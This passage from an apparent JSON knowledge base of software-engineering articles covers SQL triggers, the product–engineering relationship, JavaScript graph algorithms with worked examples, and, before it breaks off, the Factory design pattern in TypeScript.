added.\n   - AFTER UPDATE: Log changes or synchronize related tables.\n   - BEFORE DELETE: Archive or prevent deletion based on conditions.\n\n3. **Simple Trigger Example (MySQL)**\n   ```sql\n   CREATE TRIGGER before_user_delete\n   BEFORE DELETE ON users\n   FOR EACH ROW\n   SET @deleted_user_id = OLD.id;\n   ```\n\n## Common Pitfalls\n\n- Unintended side effects if triggers modify data unexpectedly.\n- Performance bottlenecks from complex or frequent triggers.\n- Debugging difficulties due to hidden logic.\n- Portability issues when migrating between database systems.\n\n## Practical Applications\n\n- Auditing changes to sensitive tables.\n- Enforcing business rules (e.g., preventing deletion of admin users).\n- Maintaining derived or summary tables.\n- Automatically updating timestamps or status fields.\n\n## References\n\n- [PostgreSQL: Triggers](https://www.postgresql.org/docs/current/plpgsql-trigger.html)\n- [MySQL: CREATE TRIGGER](https://dev.mysql.com/doc/refman/8.0/en/create-trigger.html)\n- [SQL Server: DML Triggers](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Nested Triggers:** Triggers that fire other triggers; can lead to complex chains.\n- **INSTEAD OF Triggers:** Used in views to intercept and handle DML operations.\n- **Conditional Logic:** Use trigger conditions to limit execution to specific cases.\n- **Error Handling:** Triggers can raise exceptions to prevent invalid operations.\n- **Monitoring and Auditing:** Use triggers to maintain detailed audit logs for"
    },
    {
      "id": "swe/business-value/product-swe",
      "title": "Product and Software Engineering Relationship: Complete Overview",
      "path": [
        "swe",
        "business-value",
        "product-swe"
      ],
      "content": "# Product and Software Engineering Relationship: Complete Overview\n\nThe relationship between Product and Software Engineering is a collaborative partnership where product defines **what** to build and **why**, while engineering determines **how** to build it and **when** it's feasible. Success requires continuous communication, mutual respect for expertise, and shared ownership of outcomes.\n\n## Key Points\n\n- **Product Role:** Defines vision, prioritizes features, represents user needs, measures success\n- **Engineering Role:** Designs solutions, estimates effort, maintains quality, ensures scalability\n- **Shared Responsibility:** Both own the product's success and failure\n- **Communication:** Regular sync on priorities, technical constraints, and tradeoffs\n- **Balance:** Product pushes for value; Engineering ensures sustainability\n\n## Step-by-Step Relationship & Examples\n\n1. **Discovery & Ideation**\n   ```\n   Product: Identifies user problem through research\n   \"Users abandon checkout due to long form\"\n   \n   Engineering: Explores technical solutions\n   \"We could implement autofill, reduce fields, or add save-for-later\"\n   ```\n\n2. **Scoping & Estimation**\n   ```\n   Product: Proposes feature scope\n   \"Let's add social login to reduce friction\"\n   \n   Engineering: Provides effort estimate and tradeoffs\n   \"OAuth integration: 2 weeks, but increases security surface area.\n   Alternative: Save partial forms (1 week, lower risk)\"\n   ```\n\n3. **Prioritization Discussions**\n   ```\n   Product: \"This feature could increase conversions 15%\"\n   Engineering: \"It'll take 3 sprints and delay the performance work\"\n   \n   Outcome: Negotiate minimum viable version or reprioritize\n   ```\n\n4. **Implementation & Iteration**\n   ```\n   Engineering: Builds feature, raises technical concerns mid-sprint\n   \"The third-party API has rate limits we didn't account for\"\n   \n   Product: Adjusts scope or success metrics\n   \"Let's cap at 100 logins/hour and monitor before scaling\"\n   ```\n\n5. **Launch & Feedback Loop**\n   ```\n   Product: Analyzes metrics post-launch\n   \"Feature adoption is 30%, below 50% target\"\n   \n   Engineering: Investigates technical issues\n   \"Load time is 3s on mobile—optimization needed\"\n   \n   Both: Iterate based on data\n   ```\n\n## Common Pitfalls\n\n- **Throwing requirements over the wall** (one-way communication)\n- **Engineering building in a vacuum** without user context\n- **Product ignoring technical debt** leading to system instability\n- **Late surprises** from lack of early technical involvement\n- **Blame culture** instead of shared problem-solving\n- **Scope creep** without reassessing timelines or resources\n\n## Practical Applications\n\n- **Sprint planning:** Product presents priorities, engineering estimates and flags risks\n- **Roadmap reviews:** Engineering provides feasibility check for quarterly goals\n- **Incident response:** Both investigate user impact and root cause\n- **Technical decisions:** Product understands implications (e.g., build vs. buy)\n- **User feedback sessions:** Engineers attend to understand pain points firsthand\n\n## Analogies\n\nThink of it like **building a house:**\n- **Product** is the architect: designs what the house should look like, how rooms flow, what the homeowner needs\n- **Engineering** is the contractor: determines structural feasibility, material costs, build time, foundation requirements\n\nBoth must collaborate—an architect's beautiful design fails if structurally impossible; a contractor building without vision creates a functional but unusable space.\n\n## References\n\n- [Marty Cagan: Inspired - Product/Eng Collaboration](https://www.svpg.com/inspired-how-to-create-products-customers-love/)\n- [Shreyas Doshi: Product-Eng Partnership Principles](https://twitter.com/shreyas/status/1407743162065539077)\n- [Silicon Valley Product Group: Cross-Functional Teams](https://www.svpg.com/cross-functional-product-teams/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Embedded vs. Separated Teams:** Co-located engineers and PMs share context faster than siloed orgs\n- **Technical Product Managers:** Some orgs use TPMs to bridge deep technical discussions\n- **RFC (Request for Comments) Process:** Engineers propose technical designs; product weighs in on user impact\n- **Dual-Track Agile:** Product discovery and engineering delivery run in parallel with shared learning\n- **Shared Metrics:** Both measured on outcomes (e.g., conversion rate) not outputs (features shipped)\n- **Escalation Paths:** Clear decision-making framework when product and engineering disagree (e.g., engineering can veto for security; product for user value)\n\n### Healthy Dynamics\n- Engineering attends user research sessions\n- Product sits in architecture reviews\n- Joint retros on what worked/didn't\n- Transparent roadmaps accessible to both teams\n- Regular \"state of the system\" updates from engineering to product"
    },
    {
      "id": "swe/data_structures_algos/graph_data_structures",
      "title": "Graph Data Structures in JavaScript",
      "path": [
        "swe",
        "data_structures_algos",
        "graph_data_structures"
      ],
      "content": "# Graph Data Structures in JavaScript\n\nA graph is a non-linear data structure consisting of nodes (vertices) and edges that connect them. Graphs model relationships and networks, making them essential for social networks, maps, recommendation systems, and dependency resolution.\n\n## Key Points\n\n- **Components:** Graphs consist of vertices (nodes) and edges (connections between nodes)\n- **Types:** Directed vs undirected, weighted vs unweighted, cyclic vs acyclic\n- **Representations:** Adjacency list (space-efficient) and adjacency matrix (fast lookups)\n- **Common Operations:** Add/remove vertices and edges, check connectivity, find paths\n- **Traversal Methods:** Depth-First Search (DFS) and Breadth-First Search (BFS)\n- **Applications:** Social networks, routing algorithms, dependency graphs, recommendation engines\n- **Complexity:** Space O(V + E), traversal O(V + E) where V = vertices, E = edges\n\n## Step-by-Step Explanation & Examples\n\n### 1. Basic Graph Implementation (Adjacency List)\n\nMost practical implementation for sparse graphs:\n\n```js\nclass Graph {\n  constructor() {\n    this.adjacencyList = {};\n  }\n\n  addVertex(vertex) {\n    if (!this.adjacencyList[vertex]) {\n      this.adjacencyList[vertex] = [];\n    }\n  }\n\n  addEdge(v1, v2) {\n    this.adjacencyList[v1].push(v2);\n    this.adjacencyList[v2].push(v1); // Undirected graph\n  }\n\n  removeEdge(v1, v2) {\n    this.adjacencyList[v1] = this.adjacencyList[v1].filter(v => v !== v2);\n    this.adjacencyList[v2] = this.adjacencyList[v2].filter(v => v !== v1);\n  }\n\n  removeVertex(vertex) {\n    while (this.adjacencyList[vertex].length) {\n      const adjacentVertex = this.adjacencyList[vertex].pop();\n      this.removeEdge(vertex, adjacentVertex);\n    }\n    delete this.adjacencyList[vertex];\n  }\n}\n\n// Usage\nconst graph = new Graph();\ngraph.addVertex('A');\ngraph.addVertex('B');\ngraph.addVertex('C');\ngraph.addEdge('A', 'B');\ngraph.addEdge('A', 'C');\n// Result: A connects to B and C\n```\n\n### 2. Depth-First Search (DFS)\n\nAnecdote: When building a file system explorer, I used DFS to recursively traverse directories. It naturally handles the \"go deep before going wide\" pattern - perfect for exploring nested structures.\n\n```js\nclass Graph {\n  // ... previous methods ...\n\n  dfsRecursive(start) {\n    const result = [];\n    const visited = {};\n    const adjacencyList = this.adjacencyList;\n\n    function dfs(vertex) {\n      if (!vertex) return null;\n      visited[vertex] = true;\n      result.push(vertex);\n\n      adjacencyList[vertex].forEach(neighbor => {\n        if (!visited[neighbor]) {\n          return dfs(neighbor);\n        }\n      });\n    }\n\n    dfs(start);\n    return result;\n  }\n\n  dfsIterative(start) {\n    const stack = [start];\n    const result = [];\n    const visited = {};\n    visited[start] = true;\n\n    while (stack.length) {\n      const vertex = stack.pop();\n      result.push(vertex);\n\n      this.adjacencyList[vertex].forEach(neighbor => {\n        if (!visited[neighbor]) {\n          visited[neighbor] = true;\n          stack.push(neighbor);\n        }\n      });\n    }\n\n    return result;\n  }\n}\n```\n\n### 3. Breadth-First Search (BFS)\n\nUsed for finding shortest paths in unweighted graphs:\n\n```js\nclass Graph {\n  // ... previous methods ...\n\n  bfs(start) {\n    const queue = [start];\n    const result = [];\n    const visited = {};\n    visited[start] = true;\n\n    while (queue.length) {\n      const vertex = queue.shift();\n      result.push(vertex);\n\n      this.adjacencyList[vertex].forEach(neighbor => {\n        if (!visited[neighbor]) {\n          visited[neighbor] = true;\n          queue.push(neighbor);\n        }\n      });\n    }\n\n    return result;\n  }\n}\n\n// Example: Social network \"degrees of separation\"\nconst social = new Graph();\n['Alice', 'Bob', 'Charlie', 'David', 'Eve'].forEach(p => social.addVertex(p));\nsocial.addEdge('Alice', 'Bob');\nsocial.addEdge('Bob', 'Charlie');\nsocial.addEdge('Charlie', 'David');\nsocial.addEdge('Alice', 'Eve');\n\nconsole.log(social.bfs('Alice'));\n// Result: ['Alice', 'Bob', 'Eve', 'Charlie', 'David']\n// Shows connections by proximity to Alice\n```\n\n### 4. Directed Graph Implementation\n\nFor one-way relationships (followers, dependencies):\n\n```js\nclass DirectedGraph {\n  constructor() {\n    this.adjacencyList = {};\n  }\n\n  addVertex(vertex) {\n    if (!this.adjacencyList[vertex]) {\n      this.adjacencyList[vertex] = [];\n    }\n  }\n\n  addEdge(from, to) {\n    this.adjacencyList[from].push(to); // Only one direction\n  }\n\n  hasPath(start, end) {\n    const visited = new Set();\n    \n    function dfs(vertex) {\n      if (vertex === end) return true;\n      if (visited.has(vertex)) return false;\n      \n      visited.add(vertex);\n      \n      for (let neighbor of this.adjacencyList[vertex] || []) {\n        if (dfs.call(this, neighbor)) return true;\n      }\n      \n      return false;\n    }\n    \n    return dfs.call(this, start);\n  }\n}\n\n// Example: Course prerequisites\nconst courses = new DirectedGraph();\n['Intro', 'DataStructures', 'Algorithms', 'Systems'].forEach(c => courses.addVertex(c));\ncourses.addEdge('Intro', 'DataStructures');\ncourses.addEdge('DataStructures', 'Algorithms');\ncourses.addEdge('Algorithms', 'Systems');\n\nconsole.log(courses.hasPath('Intro', 'Systems')); // true\nconsole.log(courses.hasPath('Systems', 'Intro')); // false\n```\n\n### 5. Weighted Graph\n\nFor scenarios with costs/distances:\n\n```js\nclass WeightedGraph {\n  constructor() {\n    this.adjacencyList = {};\n  }\n\n  addVertex(vertex) {\n    if (!this.adjacencyList[vertex]) {\n      this.adjacencyList[vertex] = [];\n    }\n  }\n\n  addEdge(v1, v2, weight) {\n    this.adjacencyList[v1].push({ node: v2, weight });\n    this.adjacencyList[v2].push({ node: v1, weight });\n  }\n}\n\n// Example: City connections with distances\nconst map = new WeightedGraph();\n['LA', 'SF', 'Vegas', 'Phoenix'].forEach(city => map.addVertex(city));\nmap.addEdge('LA', 'SF', 380);\nmap.addEdge('LA', 'Vegas', 270);\nmap.addEdge('LA', 'Phoenix', 370);\nmap.addEdge('Vegas', 'Phoenix', 300);\n```\n\n### 6. Finding Shortest Path (BFS for Unweighted)\n\n```js\nclass Graph {\n  // ... previous methods ...\n\n  shortestPath(start, end) {\n    const queue = [[start]];\n    const visited = new Set([start]);\n\n    while (queue.length) {\n      const path = queue.shift();\n      const vertex = path[path.length - 1];\n\n      if (vertex === end) {\n        return path;\n      }\n\n      for (let neighbor of this.adjacencyList[vertex]) {\n        if (!visited.has(neighbor)) {\n          visited.add(neighbor);\n          queue.push([...path, neighbor]);\n        }\n      }\n    }\n\n    return null; // No path found\n  }\n}\n\n// Example\nconst network = new Graph();\n['A', 'B', 'C', 'D', 'E'].forEach(n => network.addVertex(n));\nnetwork.addEdge('A', 'B');\nnetwork.addEdge('A', 'C');\nnetwork.addEdge('B', 'D');\nnetwork.addEdge('C', 'E');\nnetwork.addEdge('D', 'E');\n\nconsole.log(network.shortestPath('A', 'E'));\n// Result: ['A', 'C', 'E'] (shortest path)\n```\n\n### 7. Cycle Detection\n\nImportant for dependency resolution:\n\n```js\nclass DirectedGraph {\n  // ... previous methods ...\n\n  hasCycle() {\n    const visited = new Set();\n    const recursionStack = new Set();\n\n    const hasCycleUtil = (vertex) => {\n      visited.add(vertex);\n      recursionStack.add(vertex);\n\n      for (let neighbor of this.adjacencyList[vertex] || []) {\n        if (!visited.has(neighbor)) {\n          if (hasCycleUtil(neighbor)) return true;\n        } else if (recursionStack.has(neighbor)) {\n          return true; // Cycle detected\n        }\n      }\n\n      recursionStack.delete(vertex);\n      return false;\n    };\n\n    for (let vertex in this.adjacencyList) {\n      if (!visited.has(vertex)) {\n        if (hasCycleUtil(vertex)) return true;\n      }\n    }\n\n    return false;\n  }\n}\n```\n\n## Common Pitfalls\n\n- **Not tracking visited nodes:** Causes infinite loops in cyclic graphs\n- **Wrong data structure choice:** Using adjacency matrix for sparse graphs wastes memory\n- **Forgetting edge direction:** Mixing directed/undirected operations\n- **Stack overflow with recursive DFS:** Use iterative approach for very deep graphs\n- **Not handling disconnected graphs:** Some vertices may be unreachable from start node\n- **Modifying graph during traversal:** Can cause unexpected behavior or missed nodes\n\n## Practical Applications\n\n- **Social Networks:** Friend recommendations, finding connections between users\n- **Maps and Navigation:** Route finding (GPS), shortest path algorithms\n- **Web Crawling:** Traversing links between web pages\n- **Dependency Resolution:** Package managers (npm), build systems, task scheduling\n- **Network Analysis:** Computer networks, communication protocols\n- **Recommendation Systems:** \"People who liked X also liked Y\"\n- **Game Development:** Pathfinding for AI characters, game state graphs\n\n## References\n\n- [MDN: Data Structures](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures)\n- [Graph Theory Basics](https://www.geeksforgeeks.org/graph-data-structure-and-algorithms/)\n- [Introduction to Algorithms (CLRS)](https://mitpress.mit.edu/9780262046305/introduction-to-algorithms/)\n\n---\n\n## Greater Detail: Advanced Concepts\n\n### Adjacency Matrix Implementation\n\nBetter for dense graphs with fast edge lookup requirements:\n\n```js\nclass GraphMatrix {\n  constructor(size) {\n    this.size = size;\n    this.matrix = Array(size).fill(null).map(() => Array(size).fill(0));\n    this.vertices = {};\n    this.vertexCount = 0;\n  }\n\n  addVertex(vertex) {\n    if (this.vertexCount >= this.size) {\n      throw new Error('Graph is full');\n    }\n    this.vertices[vertex] = this.vertexCount;\n    this.vertexCount++;\n  }\n\n  addEdge(v1, v2, weight = 1) {\n    const i = this.vertices[v1];\n    const j = this.vertices[v2];\n    this.matrix[i][j] = weight;\n    this.matrix[j][i] = weight; // Undirected\n  }\n\n  hasEdge(v1, v2) {\n    const i = this.vertices[v1];\n    const j = this.vertices[v2];\n    return this.matrix[i][j] !== 0;\n  }\n\n  getWeight(v1, v2) {\n    const i = this.vertices[v1];\n    const j = this.vertices[v2];\n    return this.matrix[i][j];\n  }\n}\n\n// Comparison:\n// Adjacency List: Space O(V + E), Edge check O(V)\n// Adjacency Matrix: Space O(V²), Edge check O(1)\n```\n\n### Dijkstra's Algorithm (Shortest Path in Weighted Graphs)\n\nReal-world scenario: Finding fastest route considering traffic/distance:\n\n```js\nclass WeightedGraph {\n  // ... previous methods ...\n\n  dijkstra(start, end) {\n    const distances = {};\n    const previous = {};\n    const pq = new PriorityQueue();\n    \n    // Initialize\n    for (let vertex in this.adjacencyList) {\n      if (vertex === start) {\n        distances[vertex] = 0;\n        pq.enqueue(vertex, 0);\n      } else {\n        distances[vertex] = Infinity;\n        pq.enqueue(vertex, Infinity);\n      }\n      previous[vertex] = null;\n    }\n\n    while (!pq.isEmpty()) {\n      const smallest = pq.dequeue().value;\n      \n      if (smallest === end) {\n        // Build path\n        const path = [];\n        let current = end;\n        while (current) {\n          path.push(current);\n          current = previous[current];\n        }\n        return {\n          path: path.reverse(),\n          distance: distances[end]\n        };\n      }\n\n      if (distances[smallest] !== Infinity) {\n        for (let neighbor of this.adjacencyList[smallest]) {\n          const distance = distances[smallest] + neighbor.weight;\n          \n          if (distance < distances[neighbor.node]) {\n            distances[neighbor.node] = distance;\n            previous[neighbor.node] = smallest;\n            pq.enqueue(neighbor.node, distance);\n          }\n        }\n      }\n    }\n\n    return { path: [], distance: Infinity };\n  }\n}\n\n// Simple Priority Queue implementation\nclass PriorityQueue {\n  constructor() {\n    this.values = [];\n  }\n\n  enqueue(value, priority) {\n    this.values.push({ value, priority });\n    this.sort();\n  }\n\n  dequeue() {\n    return this.values.shift();\n  }\n\n  sort() {\n    this.values.sort((a, b) => a.priority - b.priority);\n  }\n\n  isEmpty() {\n    return this.values.length === 0;\n  }\n}\n```\n\n### Topological Sort (Dependency Ordering)\n\nEssential for build systems and task scheduling:\n\n```js\nclass DirectedGraph {\n  // ... previous methods ...\n\n  topologicalSort() {\n    const visited = new Set();\n    const stack = [];\n\n    const dfsUtil = (vertex) => {\n      visited.add(vertex);\n\n      for (let neighbor of this.adjacencyList[vertex] || []) {\n        if (!visited.has(neighbor)) {\n          dfsUtil(neighbor);\n        }\n      }\n\n      stack.push(vertex);\n    };\n\n    for (let vertex in this.adjacencyList) {\n      if (!visited.has(vertex)) {\n        dfsUtil(vertex);\n      }\n    }\n\n    return stack.reverse();\n  }\n}\n\n// Example: Build order for tasks\nconst tasks = new DirectedGraph();\n['A', 'B', 'C', 'D', 'E'].forEach(t => tasks.addVertex(t));\ntasks.addEdge('A', 'C'); // A must complete before C\ntasks.addEdge('B', 'C');\ntasks.addEdge('B', 'D');\ntasks.addEdge('C', 'E');\ntasks.addEdge('D', 'E');\n\nconsole.log(tasks.topologicalSort());\n// Result: ['B', 'D', 'A', 'C', 'E'] or ['A', 'B', 'D', 'C', 'E']\n// Valid execution orders\n```\n\n### Strongly Connected Components (Kosaraju's Algorithm)\n\nFinding clusters in directed graphs:\n\n```js\nclass DirectedGraph {\n  // ... previous methods ...\n\n  getTranspose() {\n    const transposed = new DirectedGraph();\n    \n    for (let vertex in this.adjacencyList) {\n      transposed.addVertex(vertex);\n    }\n    \n    for (let vertex in this.adjacencyList) {\n      for (let neighbor of this.adjacencyList[vertex]) {\n        transposed.addEdge(neighbor, vertex); // Reverse edge\n      }\n    }\n    \n    return transposed;\n  }\n\n  findSCCs() {\n    const visited = new Set();\n    const stack = [];\n\n    // First DFS to fill stack\n    const fillOrder = (vertex) => {\n      visited.add(vertex);\n      for (let neighbor of this.adjacencyList[vertex] || []) {\n        if (!visited.has(neighbor)) {\n          fillOrder(neighbor);\n        }\n      }\n      stack.push(vertex);\n    };\n\n    for (let vertex in this.adjacencyList) {\n      if (!visited.has(vertex)) {\n        fillOrder(vertex);\n      }\n    }\n\n    // Get transposed graph\n    const transposed = this.getTranspose();\n    visited.clear();\n    const sccs = [];\n\n    // Second DFS on transposed graph\n    const dfs = (vertex, component) => {\n      visited.add(vertex);\n      component.push(vertex);\n      for (let neighbor of transposed.adjacencyList[vertex] || []) {\n        if (!visited.has(neighbor)) {\n          dfs(neighbor, component);\n        }\n      }\n    };\n\n    while (stack.length) {\n      const vertex = stack.pop();\n      if (!visited.has(vertex)) {\n        const component = [];\n        dfs(vertex, component);\n        sccs.push(component);\n      }\n    }\n\n    return sccs;\n  }\n}\n```\n\n### Graph Coloring (Scheduling Problems)\n\nAnecdote: Used this for exam scheduling - ensuring no student has conflicting exams at the same time. Each color represents a time slot.\n\n```js\nclass Graph {\n  // ... previous methods ...\n\n  greedyColoring() {\n    const colors = {};\n    const available = new Set();\n\n    for (let vertex in this.adjacencyList) {\n      // Mark colors of adjacent vertices as unavailable\n      for (let neighbor of this.adjacencyList[vertex]) {\n        if (colors[neighbor] !== undefined) {\n          available.add(colors[neighbor]);\n        }\n      }\n\n      // Find first available color\n      let color = 0;\n      while (available.has(color)) {\n        color++;\n      }\n\n      colors[vertex] = color;\n      available.clear();\n    }\n\n    return colors;\n  }\n\n  getChromaticNumber() {\n    const colors = this.greedyColoring();\n    return Math.max(...Object.values(colors)) + 1;\n  }\n}\n```\n\n### Minimum Spanning Tree (Prim's Algorithm)\n\nFinding minimum cost to connect all nodes:\n\n```js\nclass WeightedGraph {\n  // ... previous methods ...\n\n  primsMST() {\n    const visited = new Set();\n    const mst = [];\n    let totalWeight = 0;\n\n    const start = Object.keys(this.adjacencyList)[0];\n    visited.add(start);\n\n    while (visited.size < Object.keys(this.adjacencyList).length) {\n      let minEdge = null;\n      let minWeight = Infinity;\n\n      // Find minimum edge from visited to unvisited\n      for (let vertex of visited) {\n        for (let edge of this.adjacencyList[vertex]) {\n          if (!visited.has(edge.node) && edge.weight < minWeight) {\n            minWeight = edge.weight;\n            minEdge = { from: vertex, to: edge.node, weight: edge.weight };\n          }\n        }\n      }\n\n      if (minEdge) {\n        mst.push(minEdge);\n        totalWeight += minWeight;\n        visited.add(minEdge.to);\n      }\n    }\n\n    return { edges: mst, totalWeight };\n  }\n}\n\n// Example: Connecting cities with minimum cable cost\nconst network = new WeightedGraph();\n['A', 'B', 'C', 'D'].forEach(n => network.addVertex(n));\nnetwork.addEdge('A', 'B', 4);\nnetwork.addEdge('A', 'C', 2);\nnetwork.addEdge('B', 'C', 1);\nnetwork.addEdge('B', 'D', 5);\nnetwork.addEdge('C', 'D', 3);\n\nconst mst = network.primsMS T();\n// Returns minimum edges to connect all nodes\n```\n\n### Bidirectional Search (Faster Path Finding)\n\nSearch from both start and end simultaneously:\n\n```js\nclass Graph {\n  // ... previous methods ...\n\n  bidirectionalSearch(start, end) {\n    if (start === end) return [start];\n\n    const visitedFromStart = new Map([[start, null]]);\n    const visitedFromEnd = new Map([[end, null]]);\n    const queueStart = [start];\n    const queueEnd = [end];\n\n    const buildPath = (meeting, fromStart, fromEnd) => {\n      const path = [];\n      let current = meeting;\n      \n      // Build path from start to meeting\n      while (current !== null) {\n        path.unshift(current);\n        current = fromStart.get(current);\n      }\n      \n      // Build path from meeting to end\n      current = fromEnd.get(meeting);\n      while (current !== null) {\n        path.push(current);\n        current = fromEnd.get(current);\n      }\n      \n      return path;\n    };\n\n    while (queueStart.length && queueEnd.length) {\n      // Search from start\n      const vertexStart = queueStart.shift();\n      for (let neighbor of this.adjacencyList[vertexStart]) {\n        if (visitedFromEnd.has(neighbor)) {\n          return buildPath(neighbor, visitedFromStart, visitedFromEnd);\n        }\n        if (!visitedFromStart.has(neighbor)) {\n          visitedFromStart.set(neighbor, vertexStart);\n          queueStart.push(neighbor);\n        }\n      }\n\n      // Search from end\n      const vertexEnd = queueEnd.shift();\n      for (let neighbor of this.adjacencyList[vertexEnd]) {\n        if (visitedFromStart.has(neighbor)) {\n          return buildPath(neighbor, visitedFromStart, visitedFromEnd);\n        }\n        if (!visitedFromEnd.has(neighbor)) {\n          visitedFromEnd.set(neighbor, vertexEnd);\n          queueEnd.push(neighbor);\n        }\n      }\n    }\n\n    return null;\n  }\n}\n```"
    },
    {
      "id": "swe/design-patterns/factory-design-pattern",
      "title": "Factory Design Pattern: Complete Overview",
      "path": [
        "swe",
        "design-patterns",
        "factory-design-pattern"
      ],
      "content": "# Factory Design Pattern: Complete Overview\n\nThe Factory design pattern is a creational pattern that provides an interface for creating objects without specifying their exact classes. Instead of calling constructors directly with `new`, you call a factory method that decides which class to instantiate based on input parameters or application logic. Think of it like ordering food at a restaurant—you don't go into the kitchen and cook it yourself (direct instantiation); you tell the waiter what you want, and the kitchen (factory) prepares the right dish for you.\n\n## Key Points\n\n- **Purpose:** Creates objects without exposing creation logic to client\n- **Flexibility:** Easy to add new types without changing existing code\n- **Encapsulation:** Centralizes object creation in one place\n- **Variants:** Simple Factory, Factory Method, Abstract Factory\n- **Use When:** Object creation is complex or depends on conditions\n\n## High-Level Overview\n\n### What is the Factory Pattern?\n\nThe Factory pattern delegates object creation to a specialized method or class. Instead of your code knowing exactly which class to instantiate, you ask a factory to create the appropriate object for you. This decouples your code from specific implementations.\n\n**Core concept:** Separate object creation logic from business logic. The factory knows how to create objects; your code just uses them.\n\n### Why Use It?\n\n```typescript\n// ❌ Without Factory: Code tightly coupled to specific classes\nfunction processPayment(type: string, amount: number) {\n  let payment;\n  \n  if (type === 'credit_card') {\n    payment = new CreditCardPayment();\n  } else if (type === 'paypal') {\n    payment = new PayPalPayment();\n  } else if (type === 'crypto') {\n    payment = new CryptoPayment();\n  }\n  \n  payment.process(amount);\n}\n// Adding new payment type requires modifying this function\n\n// ✅ With Factory: Clean separation\nfunction processPayment(type: string, amount: number) {\n  const payment = PaymentFactory.create(type);\n  payment.process(amount);\n}\n// Adding new payment type only requires updating factory\n\nBenefits:\n- Single Responsibility: Each class does one thing\n- Open/Closed Principle: Open for extension, closed for modification\n- Easier testing: Mock the factory instead of multiple classes\n- Centralized logic: All creation rules in one place\n```\n\n### Three Main Variants\n\n```\n1. Simple Factory (not official GoF pattern)\n   - Single factory class with creation method\n   - Simplest form\n   - Good for basic use cases\n\n2. Factory Method\n   - Subclasses decide which class to instantiate\n   - Uses inheritance\n   - Official GoF pattern\n\n3. Abstract Factory\n   - Factory of factories\n   - Creates families of related objects\n   - Most complex, most flexible\n```\n\n## Simple Factory Pattern\n\nThe simplest form—a single class or function that creates objects.\n\n### Basic Example: Shape Factory\n\n```typescript\n// Product interface\ninterface Shape {\n  draw(): void;\n  area(): number;\n}\n\n// Concrete products\nclass Circle implements Shape {\n  constructor(private radius: number) {}\n  \n  draw(): void {\n    console.log(`Drawing circle with radius ${this.radius}`);\n  }\n  \n  area(): number {\n    return Math.PI * this.radius ** 2;\n  }\n}\n\nclass Rectangle implements Shape {\n  constructor(private width: number, private height: number) {}\n  \n  draw(): void {\n    console.log(`Drawing rectangle ${this.width}x${this.height}`);\n  }\n  \n  area(): number {\n    return this.width * this.height;\n  }\n}\n\nclass Triangle implements Shape {\n  constructor(private base: number, private height: number) {}\n  \n  draw(): void {\n    console.log(`Drawing triangle base=${this.base} height=${this.height}`);\n  }\n  \n  area(): number {\n    return (this.base * this.height) / 2;\n  }\n}\n\n// Simple Factory\nclass ShapeFactory {\n  static create(type: string, ...args: number[]): Shape {\n    switch (type.toLowerCase()) {\n      case 'circle':\n        return new Circle(args[0]);\n      case 'rectangle':\n        return new Rectangle(args[0], args[1]);\n      case 'triangle':\n        return new Triangle(args[0], args[1]);\n      default:\n        throw new Error(`Unknown shape type: ${type}`);\n    }\n  }\n}\n\n// Usage\nconst circle = ShapeFactory.create('circle', 5);\ncircle.draw();  // Drawing circle with radius 5\nconsole.log(circle.area());  // 78.54\n\nconst rectangle = ShapeFactory.create('rectangle', 4, 6);\nrectangle.draw();  // Drawing rectangle 4x6\nconsole.log(rectangle.area());  // 24\n\n// Adding new shape only requires:\n// 1. Create new class implementing Shape\n// 2. Add case to factory\n// Client code remains unchanged\n```\n\n### Real-World Example: Notification System\n\n```typescript\n// Product interface\ninterface Notification {\n  send(message: string, recipient: string): void;\n}\n\n// Concrete products\nclass EmailNotification implements Notification {\n  send(message: string, recipient: string): void {\n    console.log(`Sending email to ${recipient}: ${message}`);\n    // Email sending logic...\n  }\n}\n\nclass SMSNotification implements Notification {\n  send(message: string, recipient: string): void {\n    console.log(`Sending SMS to ${recipient}: ${message}`);\n    // SMS sending logic...\n  }\n}\n\nclass PushNotification implements Notification {\n  send(message: string, recipient: string): void {\n    console.log(`Sending push notification to ${recipient}: ${message}`);\n    // Push notification logic...\n  }\n}\n\nclass SlackNotification implements Notification {\n  send(message: string, recipient: string): void {\n    console.log(`Sending Slack message to ${recipient}: ${message}`);\n    // Slack API logic...\n  }\n}\n\n// Simple Factory\nclass NotificationFactory {\n  static create(type: string): Notification {\n    switch (type.toLowerCase()) {\n      case 'email':\n        return new EmailNotification();\n      case 'sms':\n        return new SMSNotification();\n      case 'push':\n        return new PushNotification();\n      case 'slack':\n        return new SlackNotification();\n      default:\n        throw new Error(`Unsupported notification type: ${type}`);\n    }\n  }\n}\n\n// Usage\nfunction notifyUser(type: string, message: string, recipient: string) {\n  const notification = NotificationFactory.create(type);\n  notification.send(message, recipient);\n}\n\nnotifyUser('email', 'Welcome!', 'user@example.com');\nnotifyUser('sms', 'Your code is 1234', '+1234567890');\nnotifyUser('slack', 'Deployment complete', '#deployments');\n```\n\n## Factory Method Pattern\n\nDefines an interface for creating objects but lets subclasses decide which class to instantiate.\n\n### Structure\n\n```typescript\n// Product interface\ninterface Product {\n  operation(): string;\n}\n\n// Concrete products\nclass ConcreteProductA implements Product {\n  operation(): string {\n    return 'Result from Product A';\n  }\n}\n\nclass ConcreteProductB implements Product {\n  operation(): string {\n    return 'Result from Product B';\n  }\n}\n\n// Creator (abstract class with factory method)\nabstract class Creator {\n  // Factory method - subclasses override this\n  abstract factoryMethod(): Product;\n  \n  // Business logic that uses the factory method\n  someOperation(): string {\n    const product = this.factoryMethod();\n    return `Creator: Working with ${product.operation()}`;\n  }\n}\n\n// Concrete creators\nclass ConcreteCreatorA extends Creator {\n  factoryMethod(): Product {\n    return new ConcreteProductA();\n  }\n}\n\nclass ConcreteCreatorB extends Creator {\n  factoryMethod(): Product {\n    return new ConcreteProductB();\n  }\n}\n\n// Usage\nfunction clientCode(creator: Creator) {\n  console.log(creator.someOperation());\n}\n\nclientCode(new ConcreteCreatorA());\n// Output: Creator: Working with Result from Product A\n\nclientCode(new ConcreteCreatorB());\n// Output: Creator: Working with Result from Product B\n```\n\n### Real-World Example: Document Editor\n\n```typescript\n// Product interface\ninterface Document {\n  open(): void;\n  save(): void;\n  close(): void;\n}\n\n// Concrete products\nclass PDFDocument implements Document {\n  open(): void {\n    console.log('Opening PDF document');\n  }\n  \n  save(): void {\n    console.log('Saving as PDF');\n  }\n  \n  close(): void {\n    console.log('Closing PDF document');\n  }\n}\n\nclass 